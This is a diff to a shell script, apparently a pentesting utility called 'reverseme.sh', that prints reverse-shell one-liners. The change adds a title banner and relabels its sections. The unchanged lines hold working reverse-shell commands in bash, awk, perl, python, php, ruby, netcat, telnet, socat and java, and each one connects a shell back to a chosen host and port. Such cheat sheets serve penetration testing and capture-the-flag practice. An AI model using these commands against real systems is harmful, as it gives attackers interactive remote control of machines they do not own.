@@ -11,9 +11,28 @@ NC='\033[0m' # Default color
 
 clear # clear the screen place # before clear, if you want to disable this option
 
+# Display Title
+function title() {
+	printf """\n${RED}
+	________                                    ______  ___     
+	___  __ \_______   ____________________________   |/  /____ 
+	__  /_/ /  _ \_ | / /  _ \_  ___/_  ___/  _ \_  /|_/ /_  _ \\
+	_  _, _//  __/_ |/ //  __/  /   _(__  )/  __/  /  / / /  __/
+	/_/ |_| \___/_____/ \___//_/    /____/ \___//_/  /_/  \___/                                                               
+
+	${NC}"""
+
+	printf "${RED}\nWritten by:${NC} Matthew Greer"
+	printf "${RED}\nGithub:${NC} https://github.com/DFC302"
+	printf "${RED}\nHTB Profile:${NC} https://www.hackthebox.eu/profile/17842\n"
+
+}
+
 # Display bash shells
 function bash() {
-    printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}BASH REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "bash -i >& /dev/tcp/${HOST}/${LPORT} 0>&1"
 
@@ -31,7 +50,9 @@ function bash() {
 }
 
 function awk() {
-    printf "\n\t${RED}##########${NC}AWK SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}AWK REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "awk 'BEGIN {s = \"/inet/tcp/0/${HOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
 
@@ -40,7 +61,9 @@ function awk() {
 
 # Display perl shells
 function perl() {
-    printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}PERL REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "perl -e 'use Socket;$i=\"${HOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 
@@ -61,7 +84,9 @@ function perl() {
 
 # Display python shells
 function python() {
-    printf "\n\t${RED}##########${NC}PYTHON SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}PYTHON REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "${GREEN} TCP: ${NC}\n"
     printf "\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
@@ -81,7 +106,9 @@ function python() {
 
 # Display php shells
 function php() {
-    printf "\n\t${RED}##########${NC}PHP SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}PHP REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "php -r '$sock=fsockopen(\"${HOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
@@ -90,7 +117,9 @@ function php() {
 
 # Display ruby shells
 function ruby() {
-    printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}RUBY REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "ruby -rsocket -e'f=TCPSocket.open(\"${HOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 
@@ -111,7 +140,9 @@ function ruby() {
 
 # Display netcat shells
 function netcat() {
-    printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}NETCAT REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "nc -e /bin/sh ${HOST} ${LPORT}"
 
@@ -132,7 +163,9 @@ function netcat() {
 
 # Display telnet shells
 function telnet() {
-    printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}TELNET REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${HOST} ${LPORT} 0/tmp/p"
 
@@ -146,7 +179,9 @@ function telnet() {
 }
 
 function socat() {
-    printf "\n\t${RED}##########${NC}SOCAT SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}SOCAT REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${HOST}:${LPORT}"
 
@@ -154,7 +189,9 @@ function socat() {
 }
 # Display java shells
 function java() {
-    printf "\n\t${RED}##########${NC}JAVA SHELL(S)${RED}##########${NC}\n\n"
+	title
+
+    printf "\n\t${RED}##########${NC}JAVA REVERSE SHELL(S)${RED}##########${NC}\n\n"
 
     printf "r = Runtime.getRuntime()"
     printf "\n"
@@ -174,6 +211,8 @@ function spawn_listener() {
 
 # Display help menu with -h option
 function help() {
+	title
+
     printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"
 
     printf "\nreverseme.sh -h Display's this help menu.\n"
@@ -191,6 +230,8 @@ function help() {
 
 # Display sources with -s option
 function sources() {
+	title
+
     printf "\n\t${RED}##########${NC}SOURCES${RED}##########${NC}\n\n"
     printf "${GREEN} PENTEST MONKEY ${NC}\n"
     printf "\thttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\n"
@@ -208,6 +249,8 @@ function sources() {
 
 # Display version information with -V option
 function version() {
+	title
+
     printf "\n\t${RED}##########${NC}VERSION${RED}##########${NC}\n\n"
 
     printf "\nVersion:\t2.2\n\n"
@@ -216,6 +259,8 @@ function version() {
 }
 
 function displayShells() {
+	title
+
     printf "\n\t${RED}##########${NC}LIST OF AVAILABLE SHELLS${RED}##########${NC}\n\n"
 
     printf "\t\t${GREEN}Shell\t Number of shells${NC}\n"
